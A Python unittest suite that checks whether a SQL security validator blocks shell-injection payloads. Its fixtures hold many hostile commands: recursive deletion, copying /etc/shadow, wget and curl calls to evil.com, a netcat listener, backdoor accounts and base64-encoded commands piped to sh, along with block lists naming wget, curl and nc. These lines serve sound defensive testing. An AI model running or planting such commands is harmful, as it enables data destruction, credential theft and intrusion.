#!/usr/bin/env python3
"""
Shell Script Protection Tests

This test suite validates protection against shell script injection and dangerous system calls:
- Operating system command injection
- Shell metacharacter abuse
- Binary execution attempts
- System service manipulation
- File system operations
- Network operations
- Process control commands
- Privilege escalation attempts
- Cross-platform shell attacks
"""

import unittest
import os
from typing import List, Dict, Tuple

# Import the function we want to test
from app import validate_sql_security


class TestShellProtection(unittest.TestCase):
    """Test protection against shell command injection"""
    
    def setUp(self):
        """Set up shell attack test cases"""
        self.shell_attacks = {
            # Direct shell command execution
            'direct_commands': [
                ("SELECT * FROM users; xp_cmdshell 'dir'", "SQL Server command execution"),
                ("SELECT * FROM users; xp_cmdshell 'whoami'", "User enumeration via SQL Server"),
                ("SELECT * FROM users; xp_cmdshell 'net user'", "User account enumeration"),
                ("SELECT * FROM users; xp_cmdshell 'ipconfig'", "Network configuration access"),
                ("SELECT * FROM users; EXEC xp_cmdshell 'cmd.exe /c dir'", "Explicit cmd.exe execution"),
                ("SELECT system('ls -la')", "MySQL system function abuse"),
                ("SELECT system('/bin/bash -c \"whoami\"')", "Bash execution via MySQL"),
                ("SELECT system('uname -a')", "System information gathering"),
            ],
            
            # Shell metacharacters and operators
            'shell_metacharacters': [
                ("SELECT * FROM users | sh", "Pipe to shell"),
                ("SELECT * FROM users && rm -rf /", "Command chaining with AND"),
                ("SELECT * FROM users || echo 'pwned'", "Command chaining with OR"),
                ("SELECT * FROM users; ls > /tmp/output", "Output redirection"),
                ("SELECT * FROM users; cat /etc/passwd >> /tmp/stolen", "Append redirection"),
                ("SELECT * FROM users; $(whoami)", "Command substitution"),
                ("SELECT * FROM users; `id`", "Backtick command execution"),
                ("SELECT * FROM users; find / -name '*.conf' | head -10", "Complex pipe chain"),
            ],
            
            # Binary and executable references
            'binary_execution': [
                ("SELECT * FROM users WHERE cmd = '/bin/sh'", "Shell binary reference"),
                ("SELECT * FROM users WHERE cmd = '/bin/bash'", "Bash binary reference"),
                ("SELECT * FROM users WHERE cmd = '/usr/bin/python'", "Python binary reference"),
                ("SELECT * FROM users WHERE path LIKE '%/bin/%'", "Binary path pattern"),
                ("SELECT * FROM users WHERE executable = '/sbin/init'", "System binary reference"),
                ("SELECT * FROM users; /usr/bin/wget http://evil.com/malware", "Download utility abuse"),
                ("SELECT * FROM users; /usr/bin/curl -X POST http://evil.com", "HTTP client abuse"),
                ("SELECT * FROM users; /bin/nc -l -p 4444", "Netcat listener"),
                ("SELECT * FROM users; /usr/bin/ssh user@target", "SSH connection attempt"),
            ],
            
            # System administration commands
            'system_admin': [
                ("SELECT * FROM users; chmod +x /tmp/backdoor", "File permission modification"),
                ("SELECT * FROM users; chown root:root /tmp/backdoor", "File ownership change"),
                ("SELECT * FROM users; sudo su -", "Privilege escalation"),
                ("SELECT * FROM users; su - root", "User switching"),
                ("SELECT * FROM users; passwd root", "Password modification"),
                ("SELECT * FROM users; useradd hacker", "User account creation"),
                ("SELECT * FROM users; usermod -a -G sudo hacker", "Group membership modification"),
                ("SELECT * FROM users; crontab -e", "Cron job modification"),
                ("SELECT * FROM users; at now + 1 minute", "Job scheduling"),
            ],
            
            # Process control and monitoring
            'process_control': [
                ("SELECT * FROM users; ps aux", "Process enumeration"),
                ("SELECT * FROM users; top", "System monitoring"),
                ("SELECT * FROM users; kill -9 $$", "Process termination"),
                ("SELECT * FROM users; killall -9 httpd", "Mass process termination"),
                ("SELECT * FROM users; pkill -f mysql", "Pattern-based process kill"),
                ("SELECT * FROM users; nohup malware &", "Background process execution"),
                ("SELECT * FROM users; screen -dmS backdoor", "Screen session creation"),
                ("SELECT * FROM users; tmux new-session -d", "Tmux session creation"),
            ],
            
            # File system operations
            'file_operations': [
                ("SELECT * FROM users; rm -rf /", "Recursive file deletion"),
                ("SELECT * FROM users; mv /etc/passwd /tmp/", "Critical file moving"),
                ("SELECT * FROM users; cp /etc/shadow /tmp/", "Sensitive file copying"),
                ("SELECT * FROM users; tar -czf /tmp/backup.tar.gz /etc", "Archive creation"),
                ("SELECT * FROM users; find / -perm -4000", "SUID file discovery"),
                ("SELECT * FROM users; locate password", "File location search"),
                ("SELECT * FROM users; updatedb", "File database update"),
                ("SELECT * FROM users; mount /dev/sdb1 /mnt", "File system mounting"),
                ("SELECT * FROM users; umount /dev/sdb1", "File system unmounting"),
            ],
            
            # Network operations
            'network_operations': [
                ("SELECT * FROM users; netstat -an", "Network connection enumeration"),
                ("SELECT * FROM users; ss -tulpn", "Socket statistics"),
                ("SELECT * FROM users; iptables -F", "Firewall rule clearing"),
                ("SELECT * FROM users; ifconfig eth0 down", "Network interface manipulation"),
                ("SELECT * FROM users; route add default gw", "Routing table modification"),
                ("SELECT * FROM users; nmap -sS target", "Port scanning"),
                ("SELECT * FROM users; tcpdump -i eth0", "Network packet capture"),
                ("SELECT * FROM users; wireshark", "Network analysis tool"),
            ],
            
            # System service manipulation
            'service_control': [
                ("SELECT * FROM users; systemctl stop firewalld", "Service stopping"),
                ("SELECT * FROM users; systemctl start ssh", "Service starting"),
                ("SELECT * FROM users; systemctl enable malware", "Service enabling"),
                ("SELECT * FROM users; service apache2 restart", "Service restarting"),
                ("SELECT * FROM users; /etc/init.d/mysql stop", "Init script execution"),
                ("SELECT * FROM users; chkconfig httpd on", "Service configuration"),
                ("SELECT * FROM users; update-rc.d malware defaults", "Service installation"),
            ],
            
            # Windows-specific commands
            'windows_commands': [
                ("SELECT * FROM users; powershell Get-Process", "PowerShell execution"),
                ("SELECT * FROM users; powershell -Command 'Get-Service'", "PowerShell with command"),
                ("SELECT * FROM users; cmd.exe /c dir", "Command prompt execution"),
                ("SELECT * FROM users; wmic process call create", "WMI process creation"),
                ("SELECT * FROM users; reg query HKLM", "Registry querying"),
                ("SELECT * FROM users; net user hacker password /add", "User addition"),
                ("SELECT * FROM users; sc create backdoor", "Service creation"),
                ("SELECT * FROM users; tasklist", "Process listing"),
                ("SELECT * FROM users; taskkill /f /im explorer.exe", "Process termination"),
            ],
            
            # Scripting language abuse
            'scripting_abuse': [
                ("SELECT * FROM users; python -c 'import os; os.system(\"rm -rf /\")'", "Python one-liner"),
                ("SELECT * FROM users; perl -e 'system(\"whoami\")'", "Perl one-liner"),
                ("SELECT * FROM users; ruby -e 'system(\"id\")'", "Ruby one-liner"),
                ("SELECT * FROM users; node -e 'require(\"child_process\").exec(\"whoami\")'", "Node.js execution"),
                ("SELECT * FROM users; php -r 'system(\"ls\");'", "PHP one-liner"),
                ("SELECT * FROM users; bash -c 'whoami'", "Bash command execution"),
                ("SELECT * FROM users; sh -c 'id'", "Shell command execution"),
                ("SELECT * FROM users; eval 'rm -rf /'", "Eval function abuse"),
            ],
            
            # Encoding and obfuscation attempts
            'encoded_commands': [
                ("SELECT * FROM users; echo 'd2hvYW1p' | base64 -d | sh", "Base64 encoded command"),
                ("SELECT * FROM users; printf '\\x77\\x68\\x6f\\x61\\x6d\\x69' | sh", "Hex encoded command"),
                ("SELECT * FROM users; echo -e '\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68'", "Escaped shell path"),
                ("SELECT * FROM users; $'\\x77\\x68\\x6f\\x61\\x6d\\x69'", "ANSI-C quoting"),
            ]
        }
        
        # Commands that should trigger critical severity
        self.critical_commands = [
            'xp_cmdshell', 'system(', 'shell_exec', 'exec(', 'passthru',
            'proc_open', 'popen', '/bin/', '/usr/bin/', 'powershell',
            'cmd.exe', 'bash', 'sh', '&&', '||', '$(', '`'
        ]
        
        # File system operations that should be blocked
        self.dangerous_file_ops = [
            'rm -rf', 'chmod', 'chown', 'mv /etc/', 'cp /etc/',
            'tar', 'find /', 'locate', 'mount', 'umount'
        ]
        
        # Network operations that should be blocked  
        self.network_ops = [
            'netstat', 'ss ', 'iptables', 'ifconfig', 'route',
            'nmap', 'tcpdump', 'wireshark', 'wget', 'curl'
        ]
    
    def test_direct_shell_command_blocking(self):
        """Test blocking of direct shell command execution"""
        for attack_query, description in self.shell_attacks['direct_commands']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block direct command: {description}")
                
                # Should be critical severity
                self.assertEqual(result['severity'], 'critical',
                    f"Direct command should be critical: {description}")
                
                # Should mention shell/command in error
                shell_error = any(
                    term in ' '.join(result['errors']).lower()
                    for term in ['shell', 'command', 'execution']
                )
                self.assertTrue(shell_error,
                    f"No shell/command error for: {description}")
    
    def test_shell_metacharacter_detection(self):
        """Test detection of shell metacharacters"""
        for attack_query, description in self.shell_attacks['shell_metacharacters']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block metacharacter attack: {description}")
                
                # Should be high or critical severity
                self.assertIn(result['severity'], ['high', 'critical'],
                    f"Metacharacter attack severity too low: {description}")
    
    def test_binary_execution_prevention(self):
        """Test prevention of binary execution attempts"""
        for attack_query, description in self.shell_attacks['binary_execution']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Most binary references should be blocked or warned about
                total_issues = len(result['errors']) + len(result['warnings'])
                self.assertGreater(total_issues, 0,
                    f"No issues detected for binary reference: {description}")
                
                # If blocked, should have appropriate severity
                if not result['valid']:
                    self.assertIn(result['severity'], ['medium', 'high', 'critical'],
                        f"Binary execution severity too low: {description}")
    
    def test_system_admin_command_blocking(self):
        """Test blocking of system administration commands"""
        for attack_query, description in self.shell_attacks['system_admin']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # System admin commands should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block system admin command: {description}")
                
                # Should be critical severity
                self.assertEqual(result['severity'], 'critical',
                    f"System admin command should be critical: {description}")
    
    def test_process_control_blocking(self):
        """Test blocking of process control commands"""
        for attack_query, description in self.shell_attacks['process_control']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Process control should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block process control: {description}")
                
                # Should be critical severity for dangerous operations
                if any(dangerous in attack_query.lower() 
                       for dangerous in ['kill', 'pkill', 'killall']):
                    self.assertEqual(result['severity'], 'critical',
                        f"Dangerous process control should be critical: {description}")
    
    def test_file_operation_blocking(self):
        """Test blocking of dangerous file operations"""
        for attack_query, description in self.shell_attacks['file_operations']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Dangerous file operations should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block file operation: {description}")
                
                # Destructive operations should be critical
                if any(destructive in attack_query.lower() 
                       for destructive in ['rm -rf', 'mv /etc/', 'rm /etc/']):
                    self.assertEqual(result['severity'], 'critical',
                        f"Destructive file operation should be critical: {description}")
    
    def test_network_operation_blocking(self):
        """Test blocking of network operations"""
        for attack_query, description in self.shell_attacks['network_operations']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Network operations should be blocked or warned about
                total_issues = len(result['errors']) + len(result['warnings'])
                self.assertGreater(total_issues, 0,
                    f"No issues for network operation: {description}")
                
                # Destructive network operations should be blocked
                if any(dangerous in attack_query.lower() 
                       for dangerous in ['iptables -f', 'ifconfig', 'route']):
                    self.assertFalse(result['valid'],
                        f"Failed to block dangerous network operation: {description}")
    
    def test_service_control_blocking(self):
        """Test blocking of service control commands"""
        for attack_query, description in self.shell_attacks['service_control']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Service control should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block service control: {description}")
                
                # Should be high or critical severity
                self.assertIn(result['severity'], ['high', 'critical'],
                    f"Service control severity too low: {description}")
    
    def test_windows_command_blocking(self):
        """Test blocking of Windows-specific commands"""
        for attack_query, description in self.shell_attacks['windows_commands']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Windows commands should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block Windows command: {description}")
                
                # PowerShell and cmd.exe should be critical
                if any(critical_cmd in attack_query.lower() 
                       for critical_cmd in ['powershell', 'cmd.exe']):
                    self.assertEqual(result['severity'], 'critical',
                        f"Windows shell command should be critical: {description}")
    
    def test_scripting_language_abuse_blocking(self):
        """Test blocking of scripting language abuse"""
        for attack_query, description in self.shell_attacks['scripting_abuse']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Scripting abuse should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block scripting abuse: {description}")
                
                # Should be critical severity
                self.assertEqual(result['severity'], 'critical',
                    f"Scripting abuse should be critical: {description}")
    
    def test_encoded_command_blocking(self):
        """Test blocking of encoded/obfuscated commands"""
        for attack_query, description in self.shell_attacks['encoded_commands']:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Encoded commands should be blocked
                self.assertFalse(result['valid'],
                    f"Failed to block encoded command: {description}")
                
                # Should be high or critical severity
                self.assertIn(result['severity'], ['high', 'critical'],
                    f"Encoded command severity too low: {description}")
    
    def test_critical_command_detection(self):
        """Test that all critical commands are properly detected"""
        for critical_cmd in self.critical_commands:
            # Create test query with critical command
            test_query = f"SELECT * FROM users; {critical_cmd} 'test'"
            
            with self.subTest(command=critical_cmd):
                result = validate_sql_security(test_query)
                
                # Should be blocked
                self.assertFalse(result['valid'],
                    f"Critical command not blocked: {critical_cmd}")
                
                # Should be critical severity
                self.assertEqual(result['severity'], 'critical',
                    f"Critical command should have critical severity: {critical_cmd}")
    
    def test_shell_injection_in_sql_context(self):
        """Test shell injection attempts within SQL contexts"""
        sql_shell_injections = [
            # Via SQL functions
            "SELECT system('whoami') as user_info",
            "SELECT exec('xp_cmdshell ''dir''') as directory_listing",
            "SELECT shell_exec('ls -la') FROM users",
            
            # Via WHERE clauses
            "SELECT * FROM users WHERE username = 'admin'; exec('whoami'); --",
            "SELECT * FROM users WHERE id = (SELECT system('id'))",
            
            # Via UPDATE/INSERT
            "UPDATE users SET notes = system('whoami') WHERE id = 1",
            "INSERT INTO logs VALUES (1, system('date'), 'entry')",
            
            # Via stored procedures
            "CALL system('rm -rf /')",
            "EXEC master..xp_cmdshell 'net user'",
        ]
        
        for injection_query in sql_shell_injections:
            with self.subTest(query=injection_query[:50]):
                result = validate_sql_security(injection_query)
                
                # Should be blocked
                self.assertFalse(result['valid'],
                    f"SQL shell injection not blocked: {injection_query[:100]}")
                
                # Should be critical severity
                self.assertEqual(result['severity'], 'critical',
                    f"SQL shell injection should be critical: {injection_query[:50]}")
    
    def test_legitimate_queries_with_shell_keywords(self):
        """Test that legitimate queries with shell keywords are handled appropriately"""
        legitimate_queries = [
            # Legitimate uses that might contain shell-like words
            "SELECT * FROM users WHERE shell_preference = 'bash'",
            "SELECT * FROM commands WHERE name LIKE '%system%'",
            "SELECT * FROM processes WHERE executable_path = '/usr/bin/mysql'",
            "SELECT * FROM logs WHERE message CONTAINS 'exec'",
            "UPDATE users SET shell = '/bin/zsh' WHERE username = 'developer'",
            
            # Edge cases that should be warnings but not critical blocks
            "SELECT COUNT(*) FROM system_logs",
            "SELECT * FROM exec_history WHERE date > '2023-01-01'",
            "SELECT * FROM shell_configurations WHERE active = 1",
        ]
        
        for legitimate_query in legitimate_queries:
            with self.subTest(query=legitimate_query[:50]):
                result = validate_sql_security(legitimate_query)
                
                # These might generate warnings but shouldn't be blocked as critical
                if not result['valid']:
                    self.assertNotEqual(result['severity'], 'critical',
                        f"Legitimate query marked as critical: {legitimate_query}")
                
                # If blocked, should be for lower severity reasons
                if not result['valid']:
                    self.assertIn(result['severity'], ['low', 'medium', 'high'],
                        f"Legitimate query has unexpected severity: {legitimate_query}")


class TestShellProtectionEdgeCases(unittest.TestCase):
    """Test edge cases in shell protection"""
    
    def test_case_insensitive_detection(self):
        """Test that shell command detection is case insensitive"""
        case_variations = [
            "SELECT * FROM users; XP_CMDSHELL 'dir'",
            "SELECT * FROM users; xp_CmdShell 'dir'",
            "SELECT * FROM users; XP_cmdshell 'dir'",
            "SELECT SYSTEM('whoami')",
            "SELECT System('whoami')",
            "SELECT SyStEm('whoami')",
        ]
        
        for variant_query in case_variations:
            with self.subTest(query=variant_query[:50]):
                result = validate_sql_security(variant_query)
                
                self.assertFalse(result['valid'],
                    f"Case variant not detected: {variant_query}")
                self.assertEqual(result['severity'], 'critical',
                    f"Case variant should be critical: {variant_query}")
    
    def test_whitespace_evasion_detection(self):
        """Test detection of whitespace evasion techniques"""
        whitespace_evasions = [
            "SELECT * FROM users;xp_cmdshell'dir'",  # No spaces
            "SELECT * FROM users;\txp_cmdshell\t'dir'",  # Tabs
            "SELECT * FROM users;\nxp_cmdshell\n'dir'",  # Newlines
            "SELECT * FROM users; \r\nxp_cmdshell \r\n'dir'",  # CRLF
            "SELECT/**/system('whoami')",  # Comment-based whitespace
        ]
        
        for evasion_query in whitespace_evasions:
            with self.subTest(query=evasion_query[:50]):
                result = validate_sql_security(evasion_query)
                
                self.assertFalse(result['valid'],
                    f"Whitespace evasion not detected: {evasion_query}")
                self.assertEqual(result['severity'], 'critical',
                    f"Whitespace evasion should be critical: {evasion_query}")
    
    def test_shell_command_in_strings(self):
        """Test detection of shell commands within string contexts"""
        string_contexts = [
            "SELECT * FROM users WHERE notes = 'Call xp_cmdshell to execute'",
            "SELECT * FROM logs WHERE command LIKE '%system(%'",
            "INSERT INTO commands VALUES ('dangerous: rm -rf /')",
            "UPDATE users SET bio = 'I use /bin/bash as my shell'",
        ]
        
        for string_query in string_contexts:
            with self.subTest(query=string_query[:50]):
                result = validate_sql_security(string_query)
                
                # These should generate warnings but might not be blocked
                # The presence of dangerous patterns in strings is suspicious
                total_issues = len(result['errors']) + len(result['warnings'])
                self.assertGreater(total_issues, 0,
                    f"No issues for shell command in string: {string_query}")
    
    def test_nested_shell_commands(self):
        """Test detection of nested shell command structures"""
        nested_commands = [
            "SELECT system(system('whoami'))",
            "SELECT exec(xp_cmdshell('powershell Get-Process'))",
            "SELECT * FROM users; exec('xp_cmdshell ''dir''); --",
        ]
        
        for nested_query in nested_commands:
            with self.subTest(query=nested_query[:50]):
                result = validate_sql_security(nested_query)
                
                self.assertFalse(result['valid'],
                    f"Nested shell command not blocked: {nested_query}")
                self.assertEqual(result['severity'], 'critical',
                    f"Nested shell command should be critical: {nested_query}")


if __name__ == '__main__':
    # Run shell protection tests
    unittest.main(verbosity=2)